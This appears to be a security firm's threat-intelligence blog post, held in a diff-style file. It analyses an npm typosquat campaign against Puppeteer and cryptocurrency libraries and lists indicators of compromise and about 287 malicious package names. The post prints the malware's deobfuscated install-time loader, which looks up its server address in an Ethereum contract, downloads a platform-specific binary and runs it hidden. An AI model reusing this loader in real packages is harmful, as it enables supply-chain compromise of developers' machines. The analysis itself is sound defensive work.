@@ -1,0 +1,481 @@
+
+Ghosts and goblins abound on Halloween. Nowhere is this more true than throughout open source package registries, where specters lurk around every package install. On the eve of October 31, 2024, our automated detection platform surfaced several packages of interest. As this campaign began to unfold in earnest, it became clear that this attacker was in the early stages of a typosquat campaign targeting developers intending to use the popular Puppeteer, Bignum.js, and various cryptocurrency libraries (287 malware packages so far!). This comes on the heels of another attack targeting Ethers.js forks just a few weeks ago.
+Overview
+We often see attackers begin campaigns with several test publications. This appears to be the case here as well, with the first package publication to npm titled daun124wdsa8
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_632530\Screenshot20241030at23.03.19.png
+This package contained the following package.json with a postinstall hook that executes the clzypp8j.js file.
+{
+  "name": "daun124wdsa8",
+  "version": "23.6.1",
+  "description": "A high-level API to control headless Chrome over the DevTools Protocol",
+  "keywords": [
+    "puppeteer",
+    "chrome",
+    "headless",
+    "automation"
+  ],
+  ...
+  "scripts": {
+    "postinstall": "node clzypp8j.js"
+  },
+  ...
+}
+The attacker clearly intended to execute something during package installation. However, the file in question was not included in the package. An apparent oversight by the malicious package author.
+They quickly followed up with two additional publications, zalfausi8 and zalf22ausi8.
+Both of these packages contained the following obfuscated Javascript, which was executed during package installation.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_632530\Screenshot20241030at23.06.51.png
+Walking through the deobfuscated code, we see the typical malware behaviors: constructing download URLs, fetching remote executables, and surreptitiously running them on the target machine.
+What stands out is the fact that the IP address the executables are fetched from are nowhere to be found in the actual source. So how does the execution know where to send the request? Let’s take a look at the code in more detail.
+const {ethers} = require("ethers");
+const axios = require("axios");
+const fs = require('fs');
+const path = require('path');
+const os = require('os');
+const {spawn} = require('child_process');
+
+const abi = ["function getString(address account) public view returns (string)"];
+const provider = ethers.getDefaultProvider("mainnet");
+const contract = new ethers.Contract('0xa1b40044EBc2794f207D45143Bd82a1B86156c6b', abi, provider);
+const fetchAndUpdateIp = async () => {
+  try {
+    const ipAddrFromContract = await contract.getString("0x52221c293a21D8CA7AFD01Ac6bFAC7175D590A84");
+    return ipAddrFromContract;
+  } catch (error) {
+	// Russian for "Error getting IP address:"
+    console.error("Ошибка при получении IP адреса:", error);
+    return await fetchAndUpdateIp();
+  }
+};
+//... Clipped for brevity
+This code interacts with an Ethereum smart contract using the ethers.js library to fetch a string, in this case an IP address, associated with a specific contract address on the Ethereum mainnet. Let’s look at this line by line.
+Define the ABI
+const abi = ["function getString(address account) public view returns (string)"];
+This line specifies the ABI (Application Binary Interface) for the getString function in the smart contract. The ABI acts as a bridge, allowing JavaScript to understand and interact with the contract's functions. Here, getString is a view function that takes an Ethereum address as an argument and returns a string.
+Set up the provider
+const provider = ethers.getDefaultProvider("mainnet");
+This sets up a provider connected to the Ethereum mainnet, enabling the code to communicate with the blockchain. The getDefaultProvider function connects to a decentralized Ethereum node to facilitate read-only operations on the network.
+Create a contract instance
+const contract = new ethers.Contract('0xa1b40044EBc2794f207D45143Bd82a1B86156c6b', abi, provider);
+Using the contract's address (0xa1b40044EBc2794f207D45143Bd82a1B86156c6b), ABI, and provider, this line creates an instance of the contract, enabling interaction with it. This instance is crucial for calling the contract's functions, such as getString.
+Define the asynchronous function fetchAndUpdateIp
+const fetchAndUpdateIp = async () => { ... };
+The fetchAndUpdateIp function fetches the string (e.g., IP address) for the given ID (0x52221c293a21D8CA7AFD01Ac6bFAC7175D590A84). Here’s how it works:
+const ipAddrFromContract = await contract.getString("0x52221c293a21D8CA7AFD01Ac6bFAC7175D590A84");
+return ipAddrFromContract;
+This line calls the getString function on the contract, providing an Ethereum address as the argument. The function retrieves the associated string (such as an IP address) and returns it.
+In this particular case, the following IP address is returned: http://193.233.201.21:3001.
+Attempting to access any non-existent files on this host, returns the following. The path botnet-server feels particularly telling 💀.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_632530\Screenshot20241030at23.28.38.png
+An interesting thing about storing this data on the Ethereum blockchain is that Ethereum stores an immutable history of all values it has ever seen. Thus, we can see every IP address this threat actor has ever used.
+
+On 2024-09-23 00:55:23Z it was http://localhost:3001
+From 2024-09-24 06:18:11Z it was http://45.125.67.172:1228
+From 2024-10-21 05:01:35Z it was http://45.125.67.172:1337
+From 2024-10-22 14:54:23Z it was http://193.233.201.21:3001
+From 2024-10-26 17:44:23Z it is http://194.53.54.188:3001
+Putting It All Together
+There are several additional functions used to construct the download URL. This ensures that a binary compatible with the given OS is retrieved from the remote server.
+const getDownloadUrl = hostAddr => {
+  const platform = os.platform();
+  switch (platform) {
+    case 'win32':
+      return hostAddr + "/node-win.exe";
+    case "linux":
+      return hostAddr + "/node-linux";
+    case "darwin":
+      return hostAddr + "/node-macos";
+    default:
+      throw new Error("Unsupported platform: " + platform);
+  }
+};
+The malware author additionally creates a function for executing and running the malware in the background on the target machine.
+const executeFileInBackground = async path => {
+  try {
+    const proc = spawn(path, [], {
+      'detached': true,
+      'stdio': "ignore"
+    });
+    proc.unref();
+
+  } catch (error) {
+    console.error("Ошибка при запуске файла:", error);
+  }
+};
+And finally, they define and execute a function that puts it all together and ultimately initiates execution.
+onst runInstallation = async () => {
+  try {
+    const ipAddr = await fetchAndUpdateIp();
+    const downloadUrl = getDownloadUrl(ipAddr);
+    const tmpDir = os.tmpdir();
+    const filename = path.basename(downloadUrl);
+    const downloadPath = path.join(tmpDir, filename);
+    await downloadFile(downloadUrl, downloadPath);
+
+    if (os.platform() !== "win32") {
+      fs.chmodSync(downloadPath, "755");
+    }
+    executeFileInBackground(downloadPath);
+  } catch (error) {
+    console.error("Ошибка установки:", error);
+  }
+};
+runInstallation();
+But What's In The Binary?
+At this point, the threat actor has execution on the victim machine. The payload has been fetched from the remote server and is now running in memory. But what is exactly running in this case?
+The binary shipped to the machine is a packed Vercel package. It adds itself to start on login and updates its IP using the exact Ethereum contract/ID mechanism from above.
+It performs a handful of requests to fetch additional Javascript files and then posts system information back to the same requesting server. This information includes information about the GPU, CPU, the amount of memory on the machine, username, and OS version.
+Nascent Typosquat Campaign
+The end goal of this entire ordeal is to trick developers into installing these packages. Towards this end, the attacker appears to be attempting to gain initial access by way of typosquat packages.
+Shortly after the publication of daun124wdsa8, zalfausi8, and zalf22ausi8, we saw the publication of two more malware packages: pupeter and pupetier.
+image: D:/Desktop/malware/IntelliGraph\Dataset\Image\phylum\20241224_104012_632530\Screenshot20241030at23.39.031.png
+This is clearly an attempt to typosquat packages closely named to the legitimate Puppeteer package.
+The decision to publish their malware packages under the 23.6.1 version appears to not be a coincidence either, as the most recent version of Puppeteer is 23.6.1 published just a few days ago.
+Following these early publications, 287 additional typosquat packages have been published. As this appears to be an ongoing campaign, we expect more malicious package publications to follow.
+Conclusion
+Out of necessity, malware authors have had to endeavor to find more novel ways to hide intent and to obfsucate remote servers under their control. This is, once again, a persistent reminder that supply chain attacks are alive and well. They are continually evolving, and often targeting the broad software development community with malicious software packages.
+IOCs
+IP Addresses
+193.233.201.21:3001
+45.125.67.172:1228
+45.125.67.172:1337
+193.233.201.21:3001
+194.53.54.188:3001
+Ethereum Contracts
+0xa1b40044EBc2794f207D45143Bd82a1B86156c6b
+Hashes
+7ac12ba9822df1f6652fd3dd67f61e026719a76a
+5ded160d97657902a14ecca95acfb01c7bf957d1
+2addf6ef678f9f663b00e13e3bb2fa0a37299dd0
+Packages
+
+Created	Name	Version
+2024-10-30 08:16:04.000211	hg-leftmenu	1.0.2
+2024-10-31 02:56:24.779672	daun124wdsa8	23.6.1
+2024-10-31 02:56:24.779672	zalfausi8	23.6.1
+2024-10-31 02:56:24.779672	zalf22ausi8	23.6.1
+2024-10-31 03:44:00.406481	pupetier	23.6.1
+2024-10-31 03:44:00.406481	pupeter	23.6.1
+2024-10-31 03:50:28.176464	daun124wdsa8	23.6.1
+2024-10-31 04:18:15.005798	puppeteer-extra-stealth	2.11.2
+2024-10-31 04:18:15.005798	pupeteer-extra-plugin-adblocker	2.13.6
+2024-10-31 04:18:15.005798	pupeteerextra	3.3.6
+2024-10-31 04:18:15.005798	puppeteerpluginstealth	2.11.2
+2024-10-31 04:18:15.005798	puppeteer-extra-plugin-adblokcer	2.13.6
+2024-10-31 04:18:15.005798	pupeteer-cluster	0.24.0
+2024-10-31 04:18:15.005798	puppeteer-harr	1.1.2
+2024-10-31 04:18:15.005798	puppeteercluser	0.24.0
+2024-10-31 04:18:15.005798	puppeteerextraadblocker	2.13.6
+2024-10-31 05:01:31.006483	pupeteer-page-proxy	1.3.0
+2024-10-31 05:01:31.006483	puppeteerrecordr	1.0.7
+2024-10-31 05:01:31.006483	pupeteer-recorder	1.0.7
+2024-10-31 05:01:31.006483	pupeteer-har	1.1.2
+2024-10-31 05:34:09.718099	pupeteer-record	1.0.7
+2024-10-31 05:34:09.718099	pupeteer-screen-recorder	3.0.6
+2024-10-31 05:34:09.718099	puppeteer-req-interceptor	3.0.1
+2024-10-31 05:34:09.718099	pupeteeerproxy	1.0.3
+2024-10-31 05:34:09.718099	pupeteer-proxy	1.0.3
+2024-10-31 05:34:09.718099	pupeteerscreenrecordr	3.0.6
+2024-10-31 05:34:09.718099	puppeteerrequestinterceptor	3.0.1
+2024-10-31 05:34:09.718099	puppeteer-screencorder	3.0.6
+2024-10-31 06:19:26.704015	puppeteer-captre	1.1.1
+2024-10-31 06:19:26.704015	pupeteerreqintercepter	3.0.1
+2024-10-31 06:19:26.704015	puppeteer-autoscroll	2.0.0
+2024-10-31 06:19:26.704015	puppeterfirefox	0.5.1
+2024-10-31 06:19:26.704015	puppeteerscroll-down	2.0.0
+2024-10-31 06:19:26.704015	puppeteerfox	0.5.1
+2024-10-31 06:19:26.704015	puppeteer-firfox	0.5.1
+2024-10-31 06:19:26.704015	pupeteer-capture	1.1.1
+2024-10-31 06:19:26.704015	pupeteer-autoscroll-down	2.0.0
+2024-10-31 06:19:26.704015	pupeteer-firefox	0.5.1
+2024-10-31 06:53:04.582584	puppeteer-html2pd	1.0.0
+2024-10-31 06:53:04.582584	pupeteer-cli	1.5.1
+2024-10-31 06:53:04.582584	puppeteercaptur	1.1.1
+2024-10-31 07:37:08.321877	puppetewebr	0.0.3
+2024-10-31 07:37:08.321877	puppeteerwweb	0.0.3
+2024-10-31 07:37:08.321877	pupeteer-web	0.0.3
+2024-10-31 08:12:31.07239	trufel	5.11.5
+2024-10-31 08:12:31.07239	solity	0.0.1
+2024-10-31 08:12:31.07239	eth-gasreportr	0.2.27
+2024-10-31 08:12:31.07239	solitdy	0.0.1
+2024-10-31 08:12:31.07239	soliidty	0.0.1
+2024-10-31 08:12:31.07239	ganach-cli	6.12.2
+2024-10-31 08:12:31.07239	gnache-cli	6.12.2
+2024-10-31 09:00:23.901382	etherscna-api	10.3.0
+2024-10-31 09:00:23.901382	etherscaan-api	10.3.0
+2024-10-31 09:00:23.901382	hardhatjs	2.22.15
+2024-10-31 09:00:23.901382	web3util	4.3.2
+2024-10-31 09:00:23.901382	web-eth	4.10.0
+2024-10-31 09:00:23.901382	etherscn-api	10.3.0
+2024-10-31 09:00:23.901382	eth-gas-report	0.2.27
+2024-10-31 09:00:23.901382	ethgass-reporter	0.2.27
+2024-10-31 09:40:43.014071	web3-provdr	1.0.0-beta.55
+2024-10-31 09:40:43.014071	keyring-controller	9.0.0
+2024-10-31 09:40:43.014071	wb-eth3	4.10.0
+2024-10-31 09:40:43.014071	web-providers	1.0.0-beta.55
+2024-10-31 09:40:43.014071	eth-keycontroler	9.0.0
+2024-10-31 09:40:43.014071	wb3-eth	4.10.0
+2024-10-31 09:40:43.014071	eth-keyringcontrler	9.0.0
+2024-10-31 09:40:43.014071	solidity-covrage	0.8.13
+2024-10-31 09:40:43.014071	ethkr-controler	9.0.0
+2024-10-31 10:41:03.466393	ether-js-tx	2.1.2
+2024-10-31 10:41:03.466393	ether-multcal	0.2.3
+2024-10-31 10:41:03.466393	web3ethabii	4.3.0
+2024-10-31 10:41:03.466393	etherjs-util	7.1.5
+2024-10-31 10:41:03.466393	soliddty-coverage	0.8.13
+2024-10-31 10:41:03.466393	openzepplin-solidity	3.4.2
+2024-10-31 10:41:03.466393	wb3-provider	1.0.0-beta.55
+2024-10-31 10:41:03.466393	soliditycoverag	0.8.13
+2024-10-31 10:41:03.466393	ethers-multcall	0.2.3
+2024-10-31 10:41:03.466393	ethrereum-js-tx	2.1.2
+2024-10-31 10:41:03.466393	ethers-multicaal	0.2.3
+2024-10-31 10:41:03.466393	ozeppelinsolidty	3.4.2
+2024-10-31 10:41:03.466393	openzeppelinsolidty	3.4.2
+2024-10-31 10:41:03.466393	solidty-coveage	0.8.13
+2024-10-31 11:23:19.780035	web3tokn	1.0.6
+2024-10-31 11:23:19.780035	webb3-bzz	1.10.3
+2024-10-31 11:23:19.780035	web-eth-abi	4.3.0
+2024-10-31 11:23:19.780035	ethsg-util	3.0.1
+2024-10-31 11:23:19.780035	web3ibn	4.0.7
+2024-10-31 11:23:19.780035	wb3-tokn	1.0.6
+2024-10-31 11:23:19.780035	web3bz	1.10.3
+2024-10-31 11:23:19.780035	wb3cor	4.7.0
+2024-10-31 11:23:19.780035	web-bz	1.10.3
+2024-10-31 11:23:19.780035	web3-toekn	1.0.6
+2024-10-31 11:23:19.780035	ethblk-tracker	8.1.0
+2024-10-31 11:23:19.780035	web-bzz	1.10.3
+2024-10-31 11:23:19.780035	web3e-iban	4.0.7
+2024-10-31 11:23:19.780035	eth-tracker	8.1.0
+2024-10-31 11:23:19.780035	ethereumjsutility	7.1.5
+2024-10-31 11:23:19.780035	web3ibaan	4.0.7
+2024-10-31 12:27:07.280629	ethblock-trackr	8.1.0
+2024-10-31 12:27:07.280629	eth-rperrors	4.0.3
+2024-10-31 12:27:07.280629	eth-errors	4.0.3
+2024-10-31 12:27:07.280629	bignum.js	9.1.2
+2024-10-31 12:27:07.280629	eth-err	4.0.3
+2024-10-31 12:27:07.280629	bigumner-js	9.1.2
+2024-10-31 12:27:07.280629	eth-namehash	2.0.8
+2024-10-31 21:40:20.912816	eth-cripto	2.6.0
+2024-10-31 21:40:20.912816	eth-crpto	2.6.0
+2024-10-31 21:40:20.912816	etcrypto	2.6.0
+2024-10-31 21:40:20.912816	ethcrypro	2.6.0
+2024-10-31 21:40:20.912816	ethcontrctmetadata	1.17.0
+2024-10-31 21:40:20.912816	elighwallet	4.0.0
+2024-10-31 21:40:20.912816	ethmetadata	1.17.0
+2024-10-31 21:40:20.912816	ethlightwllet	4.0.0
+2024-10-31 21:40:20.912816	ethens-name	2.0.8
+2024-10-31 21:40:20.912816	eth-cmeta	1.17.0
+2024-10-31 21:40:20.912816	eth-lightwalet	4.0.0
+2024-10-31 21:40:20.912816	etcontract-metadata	1.17.0
+2024-10-31 22:29:52.734797	eth-qery	2.1.2
+2024-10-31 22:29:52.734797	eth-rpceerrors	2.0.2
+2024-10-31 22:29:52.734797	eth-jsun	0.1.6
+2024-10-31 22:29:52.734797	ethjsonrpc-err	2.0.2
+2024-10-31 22:29:52.734797	eth-tokns	1.1.0
+2024-10-31 22:29:52.734797	eth-rpc-ers	2.0.2
+2024-10-31 22:29:52.734797	ethquer	2.1.2
+2024-10-31 22:29:52.734797	eth-junt	0.1.6
+2024-10-31 23:16:12.245274	soliddoc	0.6.0-beta.36
+2024-10-31 23:16:12.245274	ethtok	1.1.0
+2024-10-31 23:16:12.245274	soliddgen	0.6.0-beta.36
+2024-10-31 23:16:12.245274	tokns	1.1.0
+2024-10-31 23:47:49.123568	balancee	0.0.5
+2024-10-31 23:47:49.123568	bal-eth	0.0.5
+2024-10-31 23:47:49.123568	balence	0.0.5
+2024-11-01 00:35:20.491525	explr	0.1.0
+2024-11-01 01:09:51.467717	ethxpl	0.1.0
+2024-11-01 01:09:51.467717	eth-expl	0.1.0
+2024-11-01 01:09:51.467717	wal-eth	0.0.2
+2024-11-01 01:09:51.467717	eth-xpor	0.1.0
+2024-11-01 01:09:51.467717	etwl	0.0.2
+2024-11-01 05:54:27.007159	scol	0.8.28
+2024-11-01 05:54:27.007159	bcoinn	1.0.2
+2024-11-01 05:54:27.007159	conibase	2.0.8
+2024-11-01 05:54:27.007159	coinbse	2.0.8
+2024-11-01 05:54:27.007159	bigto	39.9.0
+2024-11-01 05:54:27.007159	ganahce	7.9.2
+2024-11-01 05:54:27.007159	bcoi	1.0.2
+2024-11-01 05:54:27.007159	cryptocmopare	1.0.0
+2024-11-01 05:54:27.007159	solidty	0.0.1
+2024-11-01 05:54:27.007159	bcin	1.0.2
+2024-11-01 05:54:27.007159	coibnase	2.0.8
+2024-11-01 05:54:27.007159	cryptocomapre	1.0.0
+2024-11-01 06:31:43.175835	coingeco	1.0.0
+2024-11-01 06:31:43.175835	tehter	2.0.0
+2024-11-01 06:31:43.175835	subsrate	120240617.1.9
+2024-11-01 06:31:43.175835	tetther	2.0.0
+2024-11-01 06:31:43.175835	etherscann	0.2.2
+2024-11-01 06:31:43.175835	metamssk	0.0.1-security
+2024-11-01 06:31:43.175835	substarte	120240617.1.9
+2024-11-01 06:31:43.175835	bitg	39.9.0
+2024-11-01 06:31:43.175835	coingeck	1.0.0
+2024-11-01 06:31:43.175835	blockhain.info	2.12.1
+2024-11-01 06:31:43.175835	ethrscan	0.2.2
+2024-11-01 06:31:43.175835	metamaks	0.0.1-security
+2024-11-01 06:31:43.175835	tetherr	2.0.0
+2024-11-01 06:31:43.175835	metamsk	0.0.1-security
+2024-11-01 07:16:42.347551	litcore	4.1.10
+2024-11-01 07:16:42.347551	chainlinnk	0.8.2
+2024-11-01 07:16:42.347551	blockypher	0.3.0
+2024-11-01 07:16:42.347551	litecor	4.1.10
+2024-11-01 07:16:42.347551	blockcyper	0.3.0
+2024-11-01 07:16:42.347551	ethersan	0.2.2
+2024-11-01 07:16:42.347551	chai-link	0.8.2
+2024-11-01 07:16:42.347551	chanlink	0.8.2
+2024-11-01 07:16:42.347551	blocypher	0.3.0
+2024-11-01 07:53:57.596052	zcas	0.2.0
+2024-11-01 07:53:57.596052	rippel-lib	1.10.1
+2024-11-01 07:53:57.596052	zcah	0.2.0
+2024-11-01 07:53:57.596052	dasjhs	4.7.4
+2024-11-01 07:53:57.596052	monnero	1.0.6
+2024-11-01 07:53:57.596052	stelar-sdk	12.3.0
+2024-11-01 07:53:57.596052	dahsjs	4.7.4
+2024-11-01 07:53:57.596052	nem-libray	2.0.0-RC4
+2024-11-01 07:53:57.596052	monro	1.0.6
+2024-11-01 07:53:57.596052	riplle-lib	1.10.1
+2024-11-01 07:53:57.596052	dahsj	4.7.4
+2024-11-01 08:43:45.605577	nme-library	2.0.0-RC4
+2024-11-01 08:43:45.605577	bitcore-walet	8.19.0
+2024-11-01 08:43:45.605577	wavs-api	0.24.2
+2024-11-01 08:43:45.605577	bitcor-wallet	8.19.0
+2024-11-01 09:27:07.207727	crypt-pouch	4.0.1
+2024-11-01 09:27:07.207727	crypto-puch	4.0.1
+2024-11-01 09:27:07.207727	bitapy-sdk	6.2.1
+2024-11-01 09:27:07.207727	blockstak	21.1.1
+2024-11-01 09:27:07.207727	bitcor-mnemonic	10.5.3
+2024-11-01 09:27:07.207727	bitcore-mnemic	10.5.3
+2024-11-01 09:27:07.207727	bitcore-mnemoic	10.5.3
+2024-11-01 09:27:07.207727	blokstack	21.1.1
+2024-11-01 10:17:57.446577	tzeos-sdk	0.0.1-security
+2024-11-01 10:17:57.446577	waletconnect	1.7.8
+2024-11-01 10:17:57.446577	tronewb	6.0.0
+2024-11-01 10:17:57.446577	tronwb	6.0.0
+2024-11-01 10:17:57.446577	wallet-conncet	1.7.8
+2024-11-01 10:17:57.446577	walletconect	1.7.8
+2024-11-01 10:17:57.446577	tezo-sdk	0.0.1-security
+2024-11-01 10:17:57.446577	libbitcon	0.1.4
+2024-11-01 10:17:57.446577	bitcopre-p2p	10.5.3
+2024-11-01 10:56:00.301256	eletcrum	4.21.0
+2024-11-01 10:56:00.301256	decentrand	3.21.0
+2024-11-01 10:56:00.301256	electurm	4.21.0
+2024-11-01 10:56:00.301256	bcdt	0.0.6
+2024-11-01 10:56:00.301256	libbitoin	0.1.4
+2024-11-01 10:56:00.301256	lito-core-lib	0.13.22
+2024-11-01 10:56:00.301256	btdc	0.0.6
+2024-11-01 10:56:00.301256	litecor-lib	0.13.22
+2024-11-01 10:56:00.301256	libbtc	0.1.4
+2024-11-01 10:56:00.301256	dcentraland	3.21.0
+2024-11-01 10:56:00.301256	elctrum	4.21.0
+2024-11-01 17:08:05.505434	neextjs	1.0.3
+2024-11-01 17:08:05.505434	pretierr	3.3.3
+2024-11-01 17:51:33.836244	nodmialer	6.9.16
+2024-11-01 17:51:33.836244	nodmailr	6.9.16
+2024-11-01 22:35:37.531763	thre-js	0.77.1
+2024-11-01 22:35:37.531763	sazz	1.80.5
+2024-11-01 22:35:37.531763	chrtjs	4.4.6
+2024-11-01 22:35:37.531763	styledcomps	6.1.13
+2024-11-01 22:35:37.531763	charjs	4.4.6
+2024-11-01 23:55:18.16229	pasportt	0.7.0
+2024-11-01 23:55:18.16229	valdatr	13.12.0
+2024-11-02 00:24:31.643124	pmto	5.4.2
+2024-11-02 01:02:28.05925	grapql-yoga	5.8.0
+2024-11-02 01:02:28.05925	graphql-yga	5.8.0
+2024-11-02 05:03:22.841417	blbird	3.7.2
+2024-11-02 07:43:27.597324	tunnelagnt	0.6.0
+2024-11-02 07:43:27.597324	tnl-agent	0.6.0
+2024-11-02 07:43:27.597324	proxyagnt	6.4.0
+2024-11-02 08:09:09.635527	nod-proxy	1.0.0
+2024-11-02 08:09:09.635527	ax-proxy-fix	0.16.3
+2024-11-02 08:37:53.289567	undc	6.20.1
+2024-11-02 08:37:53.289567	agentkpalive	4.5.0
+2024-11-02 09:06:31.922728	ax-retry	4.5.0
+2024-11-02 10:01:33.227337	agentbse	7.1.1
+2024-11-02 10:01:33.227337	fetch-h	3.0.2
+2024-11-02 10:01:33.227337	agn-base	7.1.1
+2024-11-02 10:01:33.227337	agentbas	7.1.1
+2024-11-02 10:01:33.227337	axios-cookiesupport	5.0.3
+2024-11-03 01:26:18.961488	htp-https	1.0.0
+2024-11-03 01:49:14.13128	node-htproxy	0.2.4
+2024-11-03 01:49:14.13128	http-aut	4.2.0
+2024-11-03 01:49:14.13128	n-http-proxy	0.2.4
+2024-11-03 01:49:14.13128	htp-auth	4.2.0
+2024-11-03 02:15:55.53717	logjs4	6.9.1
+2024-11-03 02:40:33.049073	node-s-proxy	4.0.1
+2024-11-03 02:40:33.049073	n-socks-proxy	4.0.1
+2024-11-03 03:09:03.452352	exp-http-proxy	2.1.1
+2024-11-03 03:09:03.452352	express-httpprxy	2.1.1
+2024-11-03 03:32:30.252938	basicath	2.0.1
+2024-11-03 03:32:30.252938	oath2	0.0.1
+2024-11-03 03:57:33.45935	grannt	5.4.23
+2024-11-03 03:57:33.45935	ouath2	0.0.1
+2024-11-03 03:57:33.45935	pass-http	0.3.0
+2024-11-03 03:57:33.45935	p-http	0.3.0
+2024-11-03 04:22:38.832338	p-oauth	1.0.0
+2024-11-03 04:22:38.832338	pass-oauth2	1.8.0
+2024-11-03 04:22:38.832338	nod-http	0.0.5
+2024-11-03 04:22:38.832338	p-oauth2	1.8.0
+2024-11-03 04:22:38.832338	n-http	0.0.5
+2024-11-03 04:52:49.801823	htp2	3.3.7
+2024-11-03 04:52:49.801823	fast-http-proxy	6.3.0
+2024-11-03 04:52:49.801823	fst-http-proxy	6.3.0
+2024-11-03 05:19:02.780539	ax-middleware	0.4.0
+2024-11-03 05:19:02.780539	http-proxi-cache	1.1.3
+2024-11-03 05:19:02.780539	axios-middlware	0.4.0
+2024-11-03 05:19:02.780539	h20-2	8.2.0
+2024-11-03 05:44:08.587728	ax-throttle	1.0.2
+2024-11-03 05:44:08.587728	axios-nlm	1.4.2
+2024-11-03 05:44:08.587728	ax-ntlm	1.4.2
+2024-11-03 05:44:08.587728	axios-authref	3.3.6
+2024-11-03 05:44:08.587728	mocktp	3.15.3
+2024-11-03 05:44:08.587728	ax-auth-refresh	3.3.6
+2024-11-03 05:44:08.587728	axiosthrotle	1.0.2
+2024-11-03 06:06:44.335284	prxy-chain	2.5.4
+2024-11-03 06:06:44.335284	prox-chain	2.5.4
+2024-11-03 06:06:44.335284	http2wrap	2.2.1
+2024-11-03 06:06:44.335284	htp2-wrapper	2.2.1
+2024-11-03 06:35:18.547283	node-tunl	4.0.1
+2024-11-03 06:35:18.547283	axios-mockadptr	2.1.0
+2024-11-03 07:00:44.132933	glo-agent	3.0.0
+2024-11-03 07:00:44.132933	glbl-agent	3.0.0
+daun124wdsa8
+package.json
+clzypp8j.js
+zalfausi8
+zalf22ausi8
+ethers.js
+getString
+getString
+getDefaultProvider
+0xa1b40044EBc2794f207D45143Bd82a1B86156c6b
+getString
+fetchAndUpdateIp
+fetchAndUpdateIp
+0x52221c293a21D8CA7AFD01Ac6bFAC7175D590A84
+getString
+http://193.233.201.21:3001
+botnet-server
+2024-09-23 00:55:23Z
+http://localhost:3001
+2024-09-24 06:18:11Z
+http://45.125.67.172:1228
+2024-10-21 05:01:35Z
+http://45.125.67.172:1337
+2024-10-22 14:54:23Z
+http://193.233.201.21:3001
+2024-10-26 17:44:23Z
+http://194.53.54.188:3001
+daun124wdsa8
+zalfausi8
+zalf22ausi8
+pupeter
+pupetier
+23.6.1
+23.6.1
+193.233.201.21:3001
+45.125.67.172:1228
+45.125.67.172:1337
+193.233.201.21:3001
+194.53.54.188:3001
+0xa1b40044EBc2794f207D45143Bd82a1B86156c6b
+7ac12ba9822df1f6652fd3dd67f61e026719a76a
+5ded160d97657902a14ecca95acfb01c7bf957d1
+2addf6ef678f9f663b00e13e3bb2fa0a37299dd0
